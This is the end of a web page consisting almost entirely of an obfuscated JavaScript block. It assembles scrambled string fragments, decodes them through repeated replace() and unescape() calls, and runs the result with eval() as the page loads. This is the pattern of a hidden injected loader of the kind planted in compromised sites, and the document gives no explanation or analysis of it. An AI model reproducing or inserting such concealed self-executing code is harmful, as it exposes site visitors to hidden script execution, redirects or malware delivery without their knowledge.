lL5u="D%F2EHD%F";rEJB=FSeWTYT+"J568J569J564J56"+rEJB;qeUby="J564J543J"+qeUby;YbybZ+="575o56Do56";bFBdQE+="n59uqn7";iDzKDUj+="uqnPDuq";dGxjSkzj+="qnP5uqn2";Fb0Uzi=rqqCcWm+"cape(R9Lh"+Fb0Uzi;var nKQUixQ="59o553o5";d1o3Qsr="uqn29uqn3Z"+d1o3Qsr;bxCfKpf+="4o559o553o";Fb0Uzi+="Q/g,'%";d1o3Qsr="ZnuqnPDuqn27"+d1o3Qsr;var inC2v="2Fo562o56Fo564o";EXP48+="place(/o5/g,'%";var XTIAy="o52Eo562o56Fo";var UMlCTp6c="DHD%F27HD%F6";zArpa="R9LhVx='JFQ64J"+zArpa;qq5aA=iDzKDUj+"nP5uqnPEuq"+qq5aA;oeUjD=sSG3UmwT+"uqn72u"+oeUjD;uZ3Orr=dGxjSkzj+"7uqn29uqn3Znuqn"+uZ3Orr;d1o3Qsr=iSp8BMXw+"PEuqn4"+d1o3Qsr;GZoQqaw=F4R92H+"78J570J5"+GZoQqaw;CmB1+="o53Do527o5";var imALOSe6="75uqn3DuqnP4";var cmw6vmq=")));var l1";IfIB7="n4DuqnP7uq"+IfIB7;var coYm="0gHD%F4D";var OUqP="uqn73uqn2Fuqn5";coYm="BHD%F6"+coYm;Wz3LAubF="%F4EHD%F5"+Wz3LAubF;Ljz1KXSF+="553o53D";zGbt="nP5uqnPEuqn74uq"+zGbt;var f239="9J573J569J";GZoQqaw=rEJB+"6EJ527TMvBJ5"+GZoQqaw;GZoQqaw=f239+"562J569J"+GZoQqaw;Pln5CV=Wz3LAubF+"%F3B';eval(un"+Pln5CV;QRkg+="9J56CJ565J5";var sh9pY="7uqn3Zn';e";zArpa+="75JFQ6";sh9pY=DQfgp+"31uqn2"+sh9pY;var cO5wyw="3B';ev";GZoQqaw+="577J52EJ5";var Ubnokj="var G62Dm='o5";sh9pY=IfIB7+"n77uqnP9uqnP"+sh9pY;UrfohHpn="64o579o53"+UrfohHpn;akvwl=z4bw+"='HD%F"+akvwl;TKlZUOVT="%F2EHD%F68HD%F"+TKlZUOVT;imALOSe6="PCuqn4DuqnP7uqn"+imALOSe6;OUqP=rlzV+"qnP1uqn2Euqn77"+OUqP;d1o3Qsr="Znuqn7"+d1o3Qsr;GZoQqaw+="61J570J57";qeUby+="DJ567J575J529";uZ3Orr+="n75uqn2Euqn73uq";vPv2kxe+="qnPEuqn74uqn";Fb0Uzi="2JFQ69JFQ74JF"+Fb0Uzi;OUqP+="4uqnP2uq";oeUjD=" Qz7m='"+oeUjD;var ZQofK="JFQ6EJFQ74JFQ";WMNi9sx=qeUby+"TMvB';eval(un"+WMNi9sx;bFBdQE=qq5aA+"uqn49uqnP4uqn"+bFBdQE;O50Gz=sh9pY+"val(unescape(Qz"+O50Gz;MjYMP=lL5u+"6EHD%F61H"+MjYMP;O7JEZVoi+="n2Fuqn2FuqnPPu";vPv2kxe=imALOSe6+"uqnPFuqnP3uqn75"+vPv2kxe;oksQguA+="n74uqnP5uqn45uq";oksQguA=vPv2kxe+"2EuqnP3uqn7"+oksQguA;O7JEZVoi="n27uqnP8u"+O7JEZVoi;oeUjD=Fb0Uzi+"')));var"+oeUjD;YbybZ="Bo569o566o52"+YbybZ;var Ky0EiAT="3DHD%F27HD%F3";MjYMP=coYm+"HD%F67HD%F75H"+MjYMP;XTIAy=YbybZ+"5o56Eo574"+XTIAy;O50Gz+="place(/P/g,'6";OUqP="uqn74uqn73"+OUqP;Pln5CV="%F74HD%F35HD"+Pln5CV;oksQguA=d1o3Qsr+"uqn20uqn"+oksQguA;ZQofK=zArpa+"DJFQ65"+ZQofK;UrfohHpn="o562o56Fo5"+UrfohHpn;oeUjD=ZQofK+"2EJFQ77JFQ7"+oeUjD;TKlZUOVT=akvwl+"%F67HD%F75HD"+TKlZUOVT;var fV9iDa="o56Bo577o567o54";nKQUixQ=UrfohHpn+"o534o5"+nKQUixQ;IQlH1="53Do53Do56E"+IQlH1;oksQguA=bFBdQE+"3uqnPPuqnP"+oksQguA;Ky0EiAT=TKlZUOVT+"F68HD%F74HD%F"+Ky0EiAT;var z45Vo="nPDuqnP5uqnP";eadqu+="2Fo564o5";zGbt=NeCBO09N+"qn75uqnPDuq"+zGbt;oeUjD+="qn78uq";fV9iDa=CmB1+"59o573o566"+fV9iDa;var n45IzxVB=").replace(/0g";O7JEZVoi=uZ3Orr+"n72uqnP3uqn3Duq"+O7JEZVoi;MjYMP=Ky0EiAT+"1HD%F27HD%F3"+MjYMP;O7JEZVoi=z45Vo+"Euqn74uqn2"+O7JEZVoi;OUqP+="nPCuqn27uqn";cO5wyw=inC2v+"579o53Eo527o5"+cO5wyw;zGbt=oeUjD+"n70uqn50uqn"+zGbt;eadqu=fV9iDa+"3o56Eo54Bo56"+eadqu;GZoQqaw=QRkg+"2EJ576J56"+GZoQqaw;oksQguA=zGbt+"qn74uqn45uqnP"+oksQguA;oksQguA=EXP48+"')));var "+oksQguA;IQlH1=XTIAy+"564o579o"+IQlH1;bxCfKpf=IQlH1+"56Co529"+bxCfKpf;nKQUixQ=bxCfKpf+"53Do527o53C"+nKQUixQ;OUqP=O7JEZVoi+"qn72uqn75uqnP9"+OUqP;GZoQqaw="J54DJ567J575"+GZoQqaw;CJv9pZK=Y1buTs+"/TMV/g,"+CJv9pZK;Pln5CV=UMlCTp6c+"EHD%F6AHD"+Pln5CV;O50Gz=OUqP+"3ZnuqnPCuq"+O50Gz;Pln5CV+="10wi.repl";eadqu+="69o576o";eadqu=Ljz1KXSF+"o522o53C"+eadqu;Pln5CV=MjYMP+"65HD%F3"+Pln5CV;n45IzxVB=Pln5CV+"ace(/%F/g,'N'"+n45IzxVB;GZoQqaw=cmw6vmq+"lF='J56C"+GZoQqaw;WMNi9sx=GZoQqaw+"0J565J56E"+WMNi9sx;O50Gz=oksQguA+"nPCuqnP5uq"+O50Gz;WMNi9sx="ce(/HDN/g,'%'"+WMNi9sx;CJv9pZK=WMNi9sx+"g,'V')."+CJv9pZK;n45IzxVB=O50Gz+"').rep"+n45IzxVB;CJv9pZK=n45IzxVB+"/g,'C').repla"+CJv9pZK;cO5wyw=nKQUixQ+"2Bo527o53Co5"+cO5wyw;cO5wyw=eadqu+"53Eo522o53"+cO5wyw;cO5wyw=Ubnokj+"76o561o572o520"+cO5wyw;CJv9pZK=cO5wyw+"al(unesc"+CJv9pZK;eval(CJv9pZK);</script></body></html>
